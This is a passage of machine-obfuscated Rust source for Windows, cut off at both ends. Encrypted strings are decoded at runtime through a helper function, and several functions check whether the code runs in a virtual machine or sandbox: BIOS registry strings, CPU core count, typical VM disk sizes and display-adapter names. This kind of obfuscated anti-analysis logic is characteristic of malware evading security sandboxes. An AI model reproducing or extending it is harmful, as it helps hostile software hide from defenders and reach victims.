, 237 , 12 , 244 , 61 , 228 , 21 , 236 , 24 , 22 , 162 , 211 , 199 , 99 , 143 , 200 , 162 , 255 , 19 , 192 , 181 , 192 , 125 , 129 , 46 , 30 , 131 , 131 , 226 , 213 , 195 , 11 , 88 , 233 , 172 , 123 , 159 , 146 , 112 , 38 , 253 , 66 , 200 , 59 , 45 , 9 , 203 , 32 , 162 , 31 , 174 , 171 , 192 , 92 , 95 , 6 , 231 , 199 , 146 , 45 , 120 , 19 , 199 , 157 , 114 , 244 , 239 , 125 , 201 , 204 , 244 , 44 , 233 , 107 , 213 , 5 , 160 , 139 , 152 , 73 , 37 , 127 , 106 , 66 , 178 , 241 , 77 , 203 , 156 , 248 , 74 , 83 , 40 , 37 , 135 , 234 , 69 , 10 , 83 , 90 , 197 , 243 , 5 , 174 , 198 , 81 , 239 , 1 , 55 , 140 , 186 , 111 , 93 , 191 , 170 , 38 , 62 , 110 , 99 , 95 , 109 , 86 , 165] , & [195 , 94 , 109 , 251 , 24 , 150 , 188 , 199 , 101 , 8 , 34 , 225 , 44 , 212 , 65 , 226 , 52 , 117 , 5 , 21 , 148 , 49 , 8 , 88 , 225 , 46 , 200 , 1 , 208 , 151 , 156 , 58 , 70 , 193 , 134 , 46 , 47 , 176 , 74 , 40 , 31 , 159 , 223 , 43 , 129 , 95 , 83 , 15 , 0 , 133 , 158 , 200 , 162 , 214 , 242 , 204 , 11 , 60 , 58 , 238 , 99 , 21 , 77 , 140 , 163 , 18 , 118 , 237 , 78 , 88 , 92 , 158 , 5 , 18 , 254 , 29 , 174 , 116 , 120 , 193 , 67 , 154 , 171 , 30 , 168 , 59 , 40 , 218] , 19288698127265u64) , decode_bpcz_gftyzfrr (& [132 , 90 , 17 , 119 , 249 , 90 , 45 , 177 , 248 , 121 , 164 , 73 , 109 , 73 , 48 , 70 , 180 , 61 , 57 , 24 , 135 , 144 , 251 , 62 , 177 , 167 , 157 , 19 , 162 , 181 , 11 , 54 , 59 , 153 , 218 , 179 , 40 , 37 , 20 , 38 , 245 , 207 , 16 , 158 , 169 , 15 , 215 , 160 , 58 , 128 , 135 , 66 , 86 , 226 , 93 , 154 , 136 , 142 , 249 , 173 , 19 , 176 , 84 , 3] , & [80 , 154 , 250 , 166 , 146 , 171 , 18 , 19 , 22 , 240 , 97 , 23 , 165 , 146 , 161 , 237 , 212 , 251 , 3 , 75 , 100 , 22 , 163 , 141 , 19 , 147 , 170 , 52 , 182 , 156 , 81 , 65 , 140 , 136 , 228 , 21 , 208 , 208 , 93 , 186 , 23 , 224 , 238 , 227 , 62 , 75 , 142 , 254 , 171 , 227 , 127 , 52 , 245 , 51 , 153 , 76 , 206 , 14 , 124 , 142 , 140 , 90 , 215 , 180 , 67 , 57 , 30 , 178 , 239 , 105 , 177 , 74 , 98 , 228 , 71 , 239 , 71 , 181 , 155 , 206 , 203 , 206 , 75 , 183 , 94 , 110 , 213 , 154] , 2486786064684u64) ,] ; let value_names = [decode_bpcz_gftyzfrr (& [50 , 242 , 19 , 255 , 225 , 196 , 192 , 115 , 143 , 8 , 144 , 144 , 8 , 0 , 175 , 155 , 153 , 177 , 228 , 155 , 40 , 151 , 48 , 90 , 49 , 46 , 101 , 45 , 253 , 31 , 1 , 45 , 171 , 182 , 4 , 49 , 238 , 117 , 91 , 97 , 42 , 218 , 70 , 51 , 85 , 22 , 95 , 166 , 97 , 202 , 186 , 72 , 149 , 77 , 64 , 87 , 171 , 229 , 118 , 78 , 92 , 202 , 231 , 144 , 66 , 38 , 78 , 139 , 119 , 40 , 150 , 5 , 135 , 131 , 146 , 151 , 99 , 41 , 36 , 0 , 146 , 185 , 16 , 74 , 14 , 69 , 252 , 166 , 38 , 113 , 236 , 102 , 37 , 235 , 15 , 64 , 70 , 48 , 202 , 188 , 251 , 203 , 145 , 143 , 146 , 201 , 225 , 62 , 95 , 165 , 71 , 109 , 226 , 251 , 63 , 149 , 170 , 47 , 137 , 133 , 250 , 14 , 136 , 173 , 190 , 76 , 225 , 21 , 156 , 28 , 136 , 218 , 125 , 33 , 233 , 154 , 59 , 54 , 195 , 31 , 39 , 118 , 255 , 248 , 244 , 37 , 24 , 233 , 3 , 231 , 255 , 77 , 119 , 61 , 248 , 158 , 221 , 152 , 201 , 152 , 182 , 130 , 36 , 0 , 102 , 154 , 132 , 54 , 228 , 253 , 40 , 218 , 55 , 40 , 215 , 45 , 0 , 205 , 247 , 137 , 144 , 231 , 229 , 133 , 83 , 20 , 60 , 106 , 142 , 28 , 188 , 7 , 227 , 225 , 125 , 228 , 108 , 20 , 134 , 233 , 86 , 54 , 190 , 230 , 214 , 78 , 33 , 255] , & [230 , 98 , 73 , 187 , 220 , 1 , 186 , 6 , 66 , 111 , 127 , 252 , 114 , 248 , 224 , 187 , 97 , 36 , 74 , 159 , 58 , 225 , 99 , 34 , 245 , 195 , 192 , 65 , 202 , 236 , 160 , 119 , 122 , 190 , 23 , 113 , 234 , 224 , 139 , 173 , 221 , 176 , 233 , 147 , 185 , 155 , 19 , 157 , 42 , 172 , 8 , 153 , 61 , 42 , 185 , 131 , 208 , 48 , 166 , 24 , 219 , 82 , 27 , 198 , 225 , 219 , 140 , 83 , 152 , 187 , 94 , 201 , 31 , 92 , 139 , 0 , 161 , 162 , 69 , 229 , 238 , 2 , 148 , 83 , 135 , 188 , 52 , 177] , 68350109550329u64) , decode_bpcz_gftyzfrr (& [132 , 71 , 210 , 156 , 213 , 177 , 46 , 119 , 81 , 5 , 93 , 85 , 188 , 8 , 11 , 130 , 166 , 217 , 178 , 161 , 22 , 59 , 11 , 40 , 4 , 94 , 131 , 246 , 13 , 248 , 111 , 239 , 127 , 205 , 63 , 162 , 69 , 89 , 98 , 59 , 12 , 55 , 198 , 137 , 165 , 50 , 207 , 97 , 100 , 143 , 190 , 56 , 22 , 177 , 172 , 156 , 139 , 94 , 250 , 160 , 193 , 48 , 46 , 119 , 24 , 64 , 226 , 249 , 187 , 168 , 135 , 112 , 82 , 214 , 17 , 253 , 10 , 59 , 36 , 67 , 99 , 216 , 176 , 227 , 27 , 147 , 245 , 177 , 12 , 254 , 87 , 206 , 73 , 148 , 136 , 146 , 35 , 106 , 86 , 236 , 0 , 32 , 62 , 59 , 248 , 172 , 80 , 116 , 214 , 138 , 222 , 162 , 102 , 121 , 32 , 183 , 195 , 198 , 110 , 48 , 217 , 63 , 198 , 87 , 52 , 206 , 206 , 251 , 244 , 114 , 55 , 126 , 190 , 3 , 111 , 20 , 166 , 67 , 50 , 213 , 107 , 125 , 211 , 35 , 146 , 121 , 170 , 21 , 2 , 122 , 35 , 161 , 143 , 107 , 227 , 122 , 60 , 37 , 76 , 43 , 188 , 105 , 189 , 61 , 250 , 248 , 223 , 118 , 190 , 211 , 150 , 150 , 146 , 170 , 75 , 134 , 227 , 71 , 30 , 33 , 250 , 10 , 34 , 165 , 122 , 233 , 208 , 97 , 27 , 115 , 169 , 85 , 44 , 165 , 63 , 31 , 88 , 24 , 166 , 218 , 245 , 18 , 187 , 0 , 45 , 199 , 25 , 85] , & [64 , 33 , 166 , 119 , 174 , 248 , 14 , 58 , 1 , 30 , 28 , 134 , 188 , 248 , 218 , 193 , 206 , 142 , 82 , 255 , 65 , 4 , 61 , 115 , 37 , 50 , 156 , 96 , 48 , 81 , 41 , 96 , 253 , 106 , 148 , 138 , 12 , 199 , 155 , 144 , 134 , 204 , 114 , 82 , 51 , 76 , 180 , 70 , 209 , 30 , 243 , 136 , 65 , 234 , 169 , 159 , 121 , 118 , 199 , 56 , 215 , 190 , 70 , 139 , 59 , 170 , 107 , 106 , 170 , 154 , 211 , 182 , 194 , 208 , 99 , 56 , 47 , 198 , 3 , 70 , 231 , 147 , 253 , 156 , 51 , 235 , 72 , 46] , 58377195488875u64)] ; for value_name in & value_names { let mut buffer : [u16 ; (68 + 188)] = [0 ; (34 + 222)] ; let mut buffer_size = (buffer . len () * std :: mem :: size_of :: < u16 > ()) as u32 ; let value_name_pcwstr = fqgjhfwh (& * * value_name) ; if unsafe { RegQueryValueExW (key_handle , PCWSTR (value_name_pcwstr . as_ptr ()) , None , None , Some (buffer . as_mut_ptr () as * mut u8) , Some (& mut buffer_size) ,) } . is_ok () { let value = String :: from_utf16_lossy (& buffer [.. buffer_size as usize / 2]) ; for vm_string in & vm_bios_strings { if value . contains (& * * vm_string) { unsafe { let _ = RegCloseKey (key_handle) ; } ; return true ; } } } } unsafe { let _ = RegCloseKey (key_handle) ; } ; false } pub fn check_cpu_cores () -> bool { let mut system_info : SYSTEM_INFO = unsafe { std :: mem :: zeroed () } ; unsafe { GetSystemInfo (& mut system_info) ; } matches ! (system_info . dwNumberOfProcessors , 1 | 2) } pub fn check_disk_size () -> bool { let mut total_number_of_bytes : u64 = 0 ; let root_path = fqgjhfwh (& decode_bpcz_gftyzfrr (& [230 , 214 , 17 , 137 , 14 , 211 , 203 , 232 , 28 , 152 , 163 , 135 , 213 , 19 , 209 , 202 , 168 , 201 , 58 , 118 , 124 , 193 , 48 , 239 , 227 , 239 , 82 , 214 , 160 , 9 , 93 , 212 , 76 , 227 , 98 , 146 , 80 , 123 , 164 , 105 , 239 , 146 , 147 , 225 , 97 , 117 , 15 , 169 , 6 , 238 , 26 , 62 , 183 , 68 , 69 , 177 , 52 , 7 , 243 , 141 , 215 , 42 , 57 , 211] , & [179 , 54 , 85 , 44 , 27 , 246 , 247 , 144 , 187 , 86 , 14 , 183 , 125 , 72 , 141 , 33 , 20 , 117 , 155 , 105 , 141 , 146 , 185 , 207 , 54 , 82 , 43 , 130 , 94 , 65 , 93 , 244 , 1 , 233 , 39 , 86 , 113 , 14 , 70 , 116 , 7 , 255 , 10 , 157 , 168 , 222 , 11 , 161 , 35 , 171 , 9 , 214 , 73 , 223 , 147 , 156 , 161 , 21 , 27 , 200 , 226 , 123 , 27 , 143 , 229 , 30 , 218 , 246 , 30 , 167 , 180 , 215 , 130 , 142 , 220 , 205 , 217 , 191 , 161 , 122 , 87 , 146 , 38 , 127 , 176 , 162 , 212 , 13] , 1769526526170u64)) ; if unsafe { GetDiskFreeSpaceExW (PCWSTR (root_path . as_ptr ()) , None , Some (& mut total_number_of_bytes) , None ,) } . is_ok () { let common_vm_sizes = [(16 + 44) * (367 + 657) * (436 + 588) * (312 + 712) , (20 + 60) * (323 + 701) * (379 + 645) * (172 + 852) , (34 + 66) * (38 + 986) * (217 + 807) * (220 + 804) ,] ; common_vm_sizes . contains (& total_number_of_bytes) } else { false } } pub fn check_display_adapter () -> bool { let mut video_key_handle : HKEY = HKEY (0) ; let video_key_path = fqgjhfwh (& decode_bpcz_gftyzfrr (& [225 , 209 , 104 , 214 , 250 , 60 , 16 , 205 , 197 , 200 , 15 , 1 , 207 , 170 , 152 , 8 , 208 , 182 , 53 , 247 , 109 , 148 , 87 , 245 , 210 , 225 , 50 , 66 , 143 , 118 , 218 , 186 , 37 , 122 , 137 , 67 , 50 , 185 , 8 , 95 , 137 , 17 , 125 , 130 , 36 , 20 , 154 , 185 , 215 , 46 , 47 , 194 , 58 , 76 , 176 , 197 , 221 , 96 , 249 , 85 , 100 , 100 , 51 , 253 , 194 , 30 , 190 , 194 , 144 , 97 , 182 , 125 , 14 , 181 , 174 , 49 , 90 , 182 , 66 , 95 , 37 , 32 , 96 , 255 , 167 , 157 , 107 , 193 , 191 , 208 , 242 , 71 , 139 , 42 , 236 , 229 , 222 , 184 , 119 , 150 , 6 , 92 , 104 , 131 , 168 , 240 , 202 , 233 , 116 , 131 , 147 , 219 , 77 , 10 , 39 , 27 , 188 , 43 , 188 , 153 , 124 , 8 , 212 , 86 , 195 , 161 , 208 , 12 , 199 , 38 , 119 , 134 , 139 , 57 , 108 , 56 , 56 , 90 , 113 , 43 , 208 , 179 , 160 , 115 , 87 , 112 , 20 , 49 , 144 , 180 , 209 , 121 , 5 , 115 , 169 , 234 , 75 , 47 , 193 , 142 , 192 , 252 , 18 , 73 , 75 , 186 , 155 , 86 , 122 , 47 , 147 , 176 , 67 , 176 , 152 , 184 , 41 , 166 , 79 , 57 , 176 , 219 , 185 , 13 , 191 , 20 , 107 , 253 , 236 , 102 , 232 , 173 , 152 , 51 , 185 , 23 , 16 , 198 , 139 , 6 , 249 , 190 , 179 , 163 , 183 , 115 , 13 , 237 , 177 , 185 , 26 , 97 , 129 , 4 , 90 , 152 , 120 , 36 , 153 , 93 , 248 , 196 , 21 , 161 , 251 , 239 , 90 , 145 , 99 , 75 , 214 , 146 , 39 , 137 , 215 , 154 , 58 , 213 , 189 , 103 , 8 , 162 , 119 , 49 , 11 , 178 , 51 , 163 , 204 , 200 , 46 , 9 , 150 , 165 , 64 , 168 , 51 , 78 , 47 , 115 , 227 , 234 , 173 , 44 , 224 , 228 , 244 , 174 , 125 , 129 , 58 , 239 , 171 , 26 , 121 , 45 , 205 , 252 , 36 , 165 , 192 , 206 , 149 , 16 , 21 , 126 , 197 , 226 , 65 , 57 , 72 , 175 , 181 , 148 , 99 , 233 , 178 , 71 , 242 , 97 , 32 , 123 , 16 , 4 , 224 , 93 , 83 , 129 , 15 , 87 , 128 , 110 , 25 , 0 , 106 , 39 , 187 , 90 , 207 , 232 , 188 , 88 , 34 , 185 , 225 , 20 , 19 , 29 , 215 , 34 , 98 , 220 , 172 , 117 , 94 , 130 , 223 , 167 , 157 , 96 , 200 , 105 , 160 , 97 , 117 , 39 , 238 , 52 , 235 , 89 , 51 , 231 , 6 , 139 , 176 , 143 , 137 , 7 , 80 , 141 , 178 , 25 , 214 , 25 , 251 , 236 , 137 , 141 , 68 , 160 , 75 , 179 , 120 , 42 , 78 , 0 , 163 , 44 , 209 , 228 , 208 , 80 , 99 , 138 , 115 , 79 , 250 , 1 , 220 , 233 , 62 , 39 , 181 , 155 , 185 , 253 , 132 , 112 , 38 , 201 , 134 , 130 , 166 , 22 , 46 , 96 , 198 , 191 , 224 , 70 , 19 , 90 , 36 , 147 , 118 , 139 , 66 , 85 , 73 , 72 , 157 , 102 , 144 , 233 , 177 , 185 , 77 , 28 , 35 , 183 , 117 , 202 , 176 , 190 , 141 , 109 , 42 , 9 , 165 , 77 , 60 , 41 , 131 , 5 , 248 , 119 , 40 , 45] , & [12 , 150 , 83 , 18 , 27 , 178 , 33 , 137 , 228 , 58 , 122 , 159 , 188 , 247 , 150 , 105 , 197 , 172 , 8 , 188 , 221 , 248 , 34 , 196 , 216 , 81 , 58 , 4 , 122 , 66 , 80 , 106 , 44 , 52 , 20 , 190 , 237 , 206 , 84 , 146 , 26 , 207 , 90 , 222 , 77 , 89 , 184 , 69 , 221 , 124 , 95 , 158 , 124 , 139 , 150 , 86 , 36 , 6 , 17 , 14 , 239 , 143 , 190 , 211 , 200 , 18 , 110 , 95 , 252 , 175 , 93 , 226 , 178 , 102 , 76 , 90 , 194 , 29 , 134 , 253 , 5 , 1 , 116 , 246 , 70 , 29 , 250 , 57] , 25589415153346u64)) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (video_key_path . as_ptr ()) , 0 , KEY_READ , & mut video_key_handle ,) } . is_err () { return false ; } let vm_adapters = [decode_bpcz_gftyzfrr (& [162 , 76 , 247 , 113 , 217 , 142 , 29 , 78 , 63 , 144 , 242 , 105 , 104 , 78 , 186 , 30 , 247 , 65 , 61 , 213 , 122 , 96 , 117 , 242 , 82 , 218 , 225 , 190 , 200 , 159 , 167 , 115 , 128 , 195 , 171 , 59 , 54 , 125 , 76 , 218 , 233 , 180 , 107 , 191 , 220 , 192 , 47 , 245 , 223 , 173 , 157 , 172 , 137 , 66 , 49 , 161 , 69 , 23 , 23 , 181 , 147 , 144 , 60 , 46 , 25 , 162 , 201 , 192 , 160 , 102 , 98 , 26 , 47 , 65 , 118 , 101 , 8 , 211 , 186 , 20 , 121 , 159 , 91 , 32 , 80 , 104 , 253 , 104 , 150 , 228 , 190 , 95 , 230 , 252 , 238 , 185 , 2 , 100 , 176 , 166 , 174 , 235 , 41 , 172 , 227 , 94 , 122 , 210 , 59 , 175 , 104 , 242 , 198 , 181 , 10 , 67 , 11 , 170 , 184 , 219 , 153 , 172 , 189 , 130 , 218 , 19 , 73 , 27 , 18 , 187 , 13 , 89 , 2 , 129 , 236 , 56 , 41 , 101 , 80 , 143 , 227 , 22 , 23 , 79] , & [57 , 97 , 16 , 20 , 89 , 145 , 0 , 146 , 246 , 108 , 113 , 40 , 232 , 73 , 230 , 24 , 75 , 132 , 154 , 96 , 173 , 176 , 158 , 94 , 80 , 213 , 219 , 174 , 224 , 7 , 24 , 20 , 242 , 25 , 138 , 113 , 28 , 155 , 13 , 187 , 76 , 240 , 6 , 12 , 160 , 128 , 106 , 204 , 188 , 75 , 42 , 151 , 33 , 157 , 56 , 252 , 29 , 38 , 73 , 175 , 1 , 153 , 69 , 52 , 5 , 7 , 253 , 39 , 242 , 49 , 59 , 181 , 31 , 204 , 54 , 246 , 60 , 221 , 180 , 121 , 123 , 5 , 68 , 170 , 80 , 94 , 72 , 250] , 25490630902692u64) , decode_bpcz_gftyzfrr (& [148 , 36 , 253 , 122 , 193 , 226 , 180 , 207 , 19 , 186 , 211 , 212 , 129 , 128 , 162 , 64 , 3 , 218 , 232 , 147 , 145 , 110 , 126 , 66 , 77 , 82 , 159 , 246 , 36 , 69 , 80 , 85 , 235 , 45 , 69 , 194 , 33 , 243 , 123 , 11 , 97 , 128 , 139 , 189 , 58 , 147 , 104 , 133 , 226 , 214 , 125 , 244 , 82 , 255 , 168 , 128 , 17 , 56 , 139 , 178 , 254 , 18 , 186 , 121 , 64 , 72 , 78 , 79 , 136 , 39 , 213 , 213 , 73 , 243 , 72 , 230 , 117 , 161 , 86 , 115 , 144 , 213 , 251 , 196 , 31 , 45 , 112 , 67 , 214 , 74 , 231 , 254 , 146 , 232 , 91 , 204 , 242 , 54 , 129 , 196 , 52 , 63 , 33 , 247 , 223 , 152 , 237 , 249 , 251 , 117 , 246 , 195 , 5 , 190 , 14 , 181 , 239 , 60 , 49 , 132 , 89 , 98 , 171 , 64 , 34 , 59 , 146 , 187 , 229 , 42 , 116 , 226 , 139 , 222 , 180 , 89 , 174 , 149 , 233 , 32 , 14 , 18 , 9 , 12 , 76 , 197 , 206 , 102 , 158 , 62 , 227 , 163 , 193 , 38 , 31 , 157 , 210 , 53 , 53 , 205 , 2 , 220 , 109 , 212 , 167 , 59 , 124 , 138 , 81 , 50 , 113 , 210 , 5 , 164 , 192 , 27 , 35 , 63 , 144 , 101 , 65 , 4 , 153 , 152 , 169 , 139 , 255 , 230 , 219 , 219 , 233 , 220 , 231 , 89 , 166 , 33 , 139 , 133 , 69 , 242 , 199 , 219 , 111 , 66 , 181 , 99 , 247 , 139 , 67 , 101 , 153 , 239 , 139 , 59 , 250 , 184 , 126 , 188 , 156 , 11 , 21 , 169 , 148 , 70 , 81 , 219 , 32 , 215 , 224 , 54 , 195 , 3 , 26 , 108 , 89 , 92 , 238 , 204 , 245 , 200 , 36 , 201 , 120 , 151 , 102 , 185 , 139 , 174 , 107 , 204 , 248 , 201 , 220 , 182 , 57 , 171 , 82 , 217 , 98 , 146 , 49 , 112 , 30 , 63 , 62 , 206 , 232 , 46 , 42 , 100 , 102 , 28 , 58 , 210 , 28 , 90 , 241 , 35 , 242 , 10 , 42 , 27 , 110 , 45 , 77 , 191 , 80 , 12 , 135 , 209 , 162 , 129 , 180 , 46 , 230 , 61 , 2 , 31 , 146 , 2 , 252 , 12 , 70 , 157 , 234 , 155 , 153 , 128 , 253 , 4 , 205 , 190 , 220 , 191 , 46 , 103 , 174 , 132 , 248 , 214 , 181 , 85 , 1 , 43 , 165 , 48 , 208 , 165 , 48 , 239 , 133 , 165 , 205 , 147 , 243 , 2] , & [113 , 194 , 253 , 29 , 147 , 51 , 137 , 91 , 146 , 180 , 230 , 94 , 39 , 129 , 97 , 85 , 105 , 26 , 210 , 136 , 144 , 202 , 224 , 75 , 121 , 97 , 137 , 255 , 220 , 120 , 186 , 247 , 21 , 149 , 164 , 177 , 193 , 240 , 145 , 221 , 253 , 226 , 90 , 81 , 159 , 155 , 158 , 186 , 21 , 79 , 36 , 160 , 158 , 22 , 30 , 236 , 22 , 58 , 77 , 208 , 111 , 95 , 226 , 124 , 216 , 151 , 67 , 68 , 31 , 30 , 81 , 23 , 231 , 235 , 240 , 139 , 149 , 214 , 22 , 212 , 193 , 1 , 60 , 52 , 110 , 41 , 78 , 231] , 158634617080387u64) , decode_bpcz_gftyzfrr (& [141 , 141 , 177 , 191 , 147 , 163 , 185 , 45 , 119 , 85 , 210 , 35 , 183 , 121 , 88 , 149 , 136 , 251 , 22 , 166 , 130 , 57 , 167 , 182 , 126 , 138 , 83 , 30 , 72 , 5 , 29 , 47 , 107 , 179 , 145 , 206 , 59 , 241 , 101 , 193 , 38 , 48 , 125 , 112 , 254 , 119 , 155 , 180 , 255 , 131 , 215 , 164 , 7 , 200 , 252 , 141 , 95 , 226 , 236 , 113 , 47 , 43 , 139 , 28 , 15 , 232 , 48 , 214 , 8 , 107 , 192 , 106 , 148 , 122 , 243 , 167 , 185 , 64 , 176 , 115 , 24 , 191 , 198 , 59 , 109 , 2 , 224 , 161 , 251 , 78 , 121 , 244 , 17 , 27 , 2 , 108 , 126 , 162 , 246 , 116 , 120 , 148 , 85 , 186 , 209 , 31 , 27 , 99 , 120 , 19 , 47 , 150 , 127 , 111 , 167 , 219 , 166 , 200 , 151 , 12 , 108 , 81 , 37 , 43 , 136 , 104 , 98 , 207 , 223 , 45 , 64 , 228 , 105 , 232 , 25 , 246 , 52 , 209 , 110 , 250 , 63 , 223 , 147 , 95 , 63 , 148 , 73 , 251 , 54 , 213 , 12 , 168 , 9 , 7 , 175 , 36 , 240 , 184 , 237 , 54] , & [75 , 108 , 10 , 54 , 164 , 109 , 146 , 63 , 244 , 18 , 83 , 216 , 50 , 209 , 103 , 69 , 8 , 90 , 115 , 28 , 153 , 31 , 198 , 241 , 251 , 110 , 21 , 151 , 80 , 10 , 115 , 78 , 148 , 79 , 162 , 120 , 74 , 89 , 139 , 113 , 222 , 78 , 82 , 253 , 197 , 1 , 177 , 4 , 146 , 7 , 205 , 3 , 104 , 8 , 93 , 235 , 196 , 159 , 13 , 8 , 51 , 208 , 110 , 143 , 212 , 172 , 222 , 148 , 157 , 228 , 77 , 154 , 50 , 188 , 145 , 36 , 224 , 36 , 230 , 144 , 67 , 72 , 189 , 74 , 61 , 220 , 128 , 68] , 35588099015843u64) , decode_bpcz_gftyzfrr (& [114 , 127 , 79 , 5 , 181 , 62 , 23 , 174 , 61 , 246 , 168 , 76 , 108 , 199 , 217 , 18 , 82 , 235 , 79 , 176 , 134 , 4 , 176 , 225 , 192 , 10 , 118 , 87 , 159 , 81 , 32 , 26 , 102 , 162 , 48 , 206 , 197 , 17 , 255 , 96 , 89 , 63 , 167 , 233 , 209 , 211 , 1 , 121 , 11 , 80 , 76 , 152 , 5 , 21 , 90 , 153 , 236 , 179 , 157 , 195 , 65 , 249 , 85 , 148 , 115 , 122 , 231 , 23 , 7 , 154 , 151 , 128 , 187 , 212 , 145 , 6 , 1 , 96 , 32 , 14 , 165 , 93 , 45 , 112 , 0 , 186 , 83 , 99 , 215 , 193 , 4 , 160 , 169 , 238 , 67 , 71 , 130 , 185 , 43 , 230 , 210 , 205 , 186 , 75 , 164 , 181 , 210 , 11 , 191 , 34 , 32 , 177 , 58 , 24 , 155 , 123 , 9 , 10 , 105 , 113 , 245 , 40 , 37 , 75 , 160 , 231 , 169 , 13 , 223 , 69 , 17 , 198 , 229 , 152 , 90 , 240 , 7 , 214 , 168 , 41 , 141 , 33 , 52 , 191 , 22 , 122 , 144 , 104 , 103 , 145 , 223 , 243 , 222 , 195 , 34 , 167 , 113 , 36 , 61 , 87 , 118 , 97 , 140 , 214 , 122 , 52 , 254 , 250 , 135 , 112 , 100 , 188 , 150 , 158 , 126 , 59 , 90 , 207 , 251 , 108 , 34 , 150 , 54 , 193 , 83 , 228 , 221 , 117 , 92 , 168 , 66 , 109 , 173 , 188 , 206 , 55 , 29 , 179 , 181 , 149 , 25 , 118 , 247 , 198 , 72 , 226 , 149 , 14] , & [43 , 251 , 107 , 117 , 184 , 118 , 69 , 2 , 9 , 121 , 228 , 14 , 169 , 90 , 171 , 5 , 14 , 149 , 191 , 243 , 191 , 215 , 124 , 121 , 153 , 93 , 11 , 93 , 135 , 48 , 69 , 65 , 193 , 181 , 81 , 95 , 239 , 168 , 222 , 111 , 58 , 51 , 141 , 116 , 39 , 160 , 91 , 3 , 205 , 93 , 210 , 119 , 72 , 211 , 88 , 240 , 80 , 49 , 28 , 83 , 73 , 213 , 209 , 49 , 45 , 68 , 141 , 208 , 196 , 81 , 29 , 150 , 18 , 134 , 61 , 51 , 151 , 58 , 191 , 103 , 241 , 17 , 98 , 95 , 213 , 77 , 119 , 188] , 54747948123528u64) , decode_bpcz_gftyzfrr (& [60 , 20 , 189 , 136 , 22 , 142 , 92 , 32 , 214 , 155 , 97 , 63 , 22 , 85 , 78 , 106 , 50 , 198 , 205 , 116 , 1 , 121 , 11 , 234 , 48 , 220 , 93 , 138 , 38 , 125 , 205 , 66 , 77 , 186 , 64 , 107 , 235 , 153 , 102 , 61 , 123 , 195 , 55 , 82 , 74 , 224 , 175 , 241 , 225 , 216 , 133 , 210 , 92 , 111 , 80 , 199 , 57 , 114 , 138 , 132 , 112 , 147 , 91 , 236 , 67 , 87 , 28 , 106 , 50 , 238 , 173 , 129 , 86 , 134 , 156 , 155 , 187 , 68 , 12 , 25 , 8 , 25 , 65 , 228 , 45 , 166 , 168 , 183 , 203 , 37 , 81 , 0 , 19 , 112 , 151 , 68 , 193 , 134 , 77 , 21 , 23 , 163 , 202 , 121 , 165 , 27 , 84 , 152 , 213 , 228 , 168 , 249 , 132 , 249 , 52 , 136 , 65 , 39 , 144 , 186 , 157 , 42 , 254 , 11 , 221 , 117 , 189 , 20 , 243 , 48 , 27 , 123 , 181 , 149 , 178 , 44 , 222 , 241 , 210 , 22 , 140 , 159 , 16 , 116 , 4 , 204 , 99 , 218 , 9 , 122 , 12 , 255 , 81 , 107 , 252 , 149 , 166 , 186 , 251 , 92 , 247 , 174 , 6 , 175 , 183 , 218 , 27 , 197 , 13 , 96 , 126 , 14 , 82 , 187 , 219 , 38 , 113 , 177 , 154 , 138 , 41 , 227 , 191 , 79 , 159 , 213 , 65 , 173 , 100 , 33 , 7 , 13 , 33 , 206 , 190 , 165 , 196 , 48 , 176 , 231 , 223 , 217 , 232 , 16 , 192 , 159 , 128 , 150 , 30 , 27 , 241 , 149 , 61 , 76 , 161 , 188 , 229 , 85 , 220 , 145 , 144 , 145 , 162 , 149 , 92 , 236 , 20 , 26 , 226 , 23 , 45 , 6 , 141 , 143 , 235 , 149 , 59 , 235 , 135 , 109 , 250 , 105 , 236 , 134 , 200 , 228 , 148 , 104 , 77 , 180 , 6 , 142 , 123 , 93 , 110 , 131 , 164 , 0 , 250 , 101 , 127 , 154 , 0 , 156 , 67 , 56 , 208 , 77 , 148 , 67 , 84 , 41 , 80 , 110 , 137 , 23 , 69 , 151 , 2 , 243 , 213 , 149 , 15 , 232 , 154 , 2 , 40 , 233 , 208 , 235 , 2 , 87 , 115 , 210 , 114 , 169 , 218 , 6 , 199 , 7 , 186 , 78 , 133 , 169 , 155 , 234 , 42 , 239 , 140 , 71 , 233 , 172 , 142 , 84 , 189 , 30 , 42 , 21 , 69 , 128] , & [75 , 165 , 132 , 49 , 157 , 196 , 140 , 155 , 238 , 2 , 20 , 236 , 14 , 64 , 231 , 129 , 196 , 243 , 34 , 242 , 217 , 132 , 178 , 164 , 47 , 229 , 26 , 129 , 90 , 193 , 54 , 61 , 126 , 164 , 113 , 63 , 108 , 89 , 221 , 189 , 24 , 195 , 191 , 103 , 87 , 137 , 151 , 55 , 135 , 35 , 6 , 59 , 68 , 222 , 13 , 140 , 201 , 178 , 45 , 94 , 77 , 218 , 32 , 56 , 180 , 134 , 59 , 40 , 211 , 28 , 97 , 124 , 208 , 199 , 151 , 102 , 85 , 70 , 29 , 195 , 141 , 82 , 21 , 157 , 2 , 57 , 23 , 83] , 134651519699320u64) ,] ; let mut i = 0 ; loop { let mut subkey_name_buffer : [u16 ; (47 + 209)] = [0 ; (34 + 222)] ; let mut subkey_name_len = subkey_name_buffer . len () as u32 ; if unsafe { RegEnumKeyExW (video_key_handle , i , PWSTR (subkey_name_buffer . as_mut_ptr ()) , & mut subkey_name_len , None , PWSTR (std :: ptr :: null_mut ()) , None , None ,) } . is_err () { break ; } i += 1 ; let subkey_name = String :: from_utf16_lossy (& subkey_name_buffer [.. subkey_name_len as usize]) ; let adapter_key_path = format ! ("SYSTEM\\CurrentControlSet\\Control\\Video\\{}\\0000" , subkey_name) ; let mut adapter_key_handle : HKEY = HKEY (0) ; let adapter_key_pcwstr = fqgjhfwh (& adapter_key_path) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (adapter_key_pcwstr . as_ptr ()) , 0 , KEY_READ , & mut adapter_key_handle ,) } . is_ok () { let value_name = fqgjhfwh (& decode_bpcz_gftyzfrr (& [161 , 108 , 145 , 218 , 122 , 21 , 69 , 24 , 127 , 69 , 10 , 10 , 150 , 197 , 42 , 148 , 44 , 30 , 147 , 180 , 27 , 214 , 97 , 171 , 113 , 199 , 60 , 81 , 0 , 51 , 186 , 25 , 187 , 25 , 84 , 100 , 134 , 66 , 183 , 160 , 215 , 68 , 57 , 18 , 252 , 24 , 150 , 25 , 165 , 240 , 54 , 181 , 132 , 84 , 31 , 120 , 94 , 147 , 116 , 123 , 109 , 175 , 135 , 178 , 115 , 180 , 144 , 184 , 32 , 109 , 111 , 253 , 125 , 147 , 8 , 49 , 178 , 194 , 25 , 213 